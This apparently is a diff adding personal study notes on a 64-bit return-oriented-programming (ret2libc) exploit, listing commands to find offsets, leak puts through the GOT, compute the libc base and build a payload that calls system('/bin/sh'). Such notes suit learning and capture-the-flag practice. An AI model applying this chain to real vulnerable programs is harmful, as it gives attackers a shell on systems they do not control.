@@ -1,0 +1,80 @@
+64-Bit ROP Steps
+
+# 64-Bit exploitation, arguments go in registers not on the stack
+# Remember order registers will be called in
+# Use p64() to convert addresses to 64 byte friendly format
+
+# Stage 1
+
+1. Crash program
+2. Find offset
+	create_pattern $len
+3. Examine rsp: 
+	x/xg $rsp
+4. Find 'puts' call in binary
+	CMD - objdump -d $binary | grep puts
+	# Copy line containing binary location (plt_put) and location in GOT of puts
+	
+$ plt_put = p64(binary_location)
+$ got_put = p64(GOT_location)
+
+5. Get pop rdi
+	r2 $binary
+	/R pop RDI
+	# copy address
+
+$ pop_rdi = p64(copied_address)
+$ junk = "A" * $len
+$ payload = junk + pop_rdi + got_put + plt_put # Getting puts to call itself to leak location in memory
+
+# Run program and check memory address is printed - leaked address of puts inside libc
+# Verify that it changes
+
+$ leaked_puts = $glibc_address # Done dynamically - use pwntools here
+
+# Leaked mem no good if program has crashed
+
+CMD = objdump -d $binary | grep main
+	# copy memory address of <main>
+
+# Place as FIRST memory variable
+$ plt_main = p64(<main>)
+$ payload = junk + pop_rdi + got_put + plt_put + plt_main
+# This calls main after leak to keep program in working state
+# Run exploit: program should start again
+
+$ leaked_puts = u64($glibc_address) # Unpack
+
+Stage 2
+
+# Calculate position in libc
+# Locate where libc is
+CMD - locate libc.so.6
+CMD - cp $location . # Makes it easier to work with
+CMD - readelf -s $libc_copy | grep puts
+
+# Copy address for puts@GLIBC
+$ pop_rdi = p64(copied_address) # Copied down for readability only
+$ libc_put = $puts@GLIBC_address
+
+# Get system
+CMD - readelf -s $libc_copy | grep system
+# Copy address for system@GLIBC
+
+$ libc_sys = $system@GLIBC_address
+
+# String for /bin/sh
+CMD - strings -a -t x libc.so.6 | grep /bin/sh
+# Copy hex address/name
+
+$ libc_sh = $bin_sh_hex
+
+# Calculate offset from leaked address
+$ offset = leaked_puts - libc_put
+$ sys = p64(offset + libc_sys)
+$ sh = p64(offset + libc_sh)
+
+$ payload = junk + pop_rdi + sh + sys
+
+
+
